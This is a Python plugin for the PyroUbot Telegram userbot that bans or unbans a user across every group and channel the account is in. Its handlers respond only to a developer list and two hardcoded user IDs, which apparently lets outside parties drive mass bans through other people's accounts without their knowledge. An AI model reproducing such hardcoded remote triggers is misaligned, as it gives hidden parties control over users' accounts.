from PyroUbot import *

__MODULE__ = "gban"
__HELP__ = """
<b>◖ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ɢʙᴀɴ◗</b>

  <b>❑ ᴄᴍᴅ:</b> <code>{0}gban</ᴄᴏᴅᴇ> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ 

  <b>❑ ᴄᴍᴅ:</b> <code>{0}ungban</code> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴜɴʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
"""


@ubot.on_message(filters.command(["cgban"], ".") & filters.user([DEVS]))
@PY.UBOT("gban")
@PY.TOP_CMD
async def global_banned(client, message):
    gagal = await get_vars(client.me.id, "EMOJI_GAGAL") or "5438630285635757876"
    proses = await get_vars(client.me.id, "EMOJI_PROSES") or "5960640164114993927"
    user_id, reason = await extract_user_and_reason(message)
    Tm = await message.reply(f"<b><emoji id={proses}>⏳</emoji> ᴍᴇᴍᴘʀᴏsᴇs. . .</b>")
    if not user_id:
        return await Tm.edit(f"<b><emoji id={gagal}>❎</emoji> ᴜsᴇʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        return await Tm.edit(error)
    done = 0
    failed = 0
    emoji_global = await get_vars(client.me.id, "EMOJI_GLOBAL") or "6111585093220830556"
    gban_user = await get_vars(client.me.id, "GBAN_USER") or "6172475875368373616"
    sukses = await get_vars(client.me.id, "EMOJI_SUKSES") or "5787188704434982946"
    text = "<b>{} ɢʟᴏʙᴀʟ {}</b>\n\n<b>{} ʙᴇʀʜᴀsɪʟ: {} ᴄʜᴀᴛ</b>\n<b>{} ɢᴀɢᴀʟ: {} ᴄʜᴀᴛ</b>\n<b>{} ᴜsᴇʀ: <a href='tg://user?id={}'>{} {}</a></b>"
    if reason:
        text += "\n<b>💬 ᴀʟᴀsᴀɴ:</b> {}"
    async for dialog in client.get_dialogs():
        chat_type = dialog.chat.type
        if chat_type in [
            ChatType.GROUP,
            ChatType.SUPERGROUP,
            ChatType.CHANNEL,
        ]:
            chat_id = dialog.chat.id
            if user.id == OWNER_ID:
                return await Tm.edit("ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪsᴀ ɢʙᴀɴ ᴅɪᴀ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴘᴇᴍʙᴜᴀᴛ sᴀʏᴀ")
            elif not user.id == OWNER_ID:
                try:
                    await client.ban_chat_member(chat_id, user.id)
                    done += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
                    await asyncio.sleep(0.1)
    await Tm.delete()
    return await message.reply(text.format(f"<emoji id={emoji_global}>💬</emoji>", "ʙᴀɴɴᴇᴅ", f"<emoji id={sukses}>✅</emoji>", done, f"<emoji id={gagal}>❎</emoji>", failed, f"<emoji id={gban_user}>👤</emoji>", user.id, user.first_name, (user.last_name or ""), reason))




@ubot.on_message(filters.command(["cungban"], ".") & filters.user([1948147616, 843716328]))
@PY.UBOT("ungban")
@PY.TOP_CMD
async def global_unbanned(client, message):
    user_id = await extract_user(message)
    gagal = await get_vars(client.me.id, "EMOJI_GAGAL") or "5438630285635757876"
    proses = await get_vars(client.me.id, "EMOJI_PROSES") or "5960640164114993927"
    Tm = await message.reply(f"<b><emoji id={proses}>⏳</emoji></b> ᴍᴇᴍᴘʀᴏsᴇs. . .</b>")
    if not user_id:
        return await Tm.edit(f"<b><emoji id={gagal}>❎</emoji> ᴜsᴇʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        return await Tm.edit(error)
    done = 0
    failed = 0
    emoji_global = await get_vars(client.me.id, "EMOJI_GLOBAL") or "6111585093220830556"
    gban_user = await get_vars(client.me.id, "GBAN_USER") or "6172475875368373616"
    sukses = await get_vars(client.me.id, "EMOJI_SUKSES") or "5787188704434982946"
    text = "<b>{} ɢʟᴏʙᴀʟ {}</b>\n\n<b>{} ʙᴇʀʜᴀsɪʟ: {} ᴄʜᴀᴛ</b>\n<b>{} ɢᴀɢᴀʟ: {} ᴄʜᴀᴛ</b>\n<b>{} ᴜsᴇʀ: <a href='tg://user?id={}'>{} {}</a></b>"
    async for dialog in client.get_dialogs():
        chat_type = dialog.chat.type
        if chat_type in [
            ChatType.GROUP,
            ChatType.SUPERGROUP,
            ChatType.CHANNEL,
        ]:
            chat_id = dialog.chat.id
            try:
                await client.unban_chat_member(chat_id, user.id)
                done += 1
                await asyncio.sleep(0.1)
            except:
                failed += 1
                await asyncio.sleep(0.1)
    await Tm.delete()
    return await message.reply(text.format(f"<emoji id={emoji_global}>💬</emoji>", "ᴜɴʙᴀɴɴᴇᴅ", f"<emoji id={sukses}>✅</emoji>", done, f"<emoji id={gagal}>❎</emoji>", failed, f"<emoji id={gban_user}>👤</emoji>", user.id, user.first_name, (user.last_name or "")))


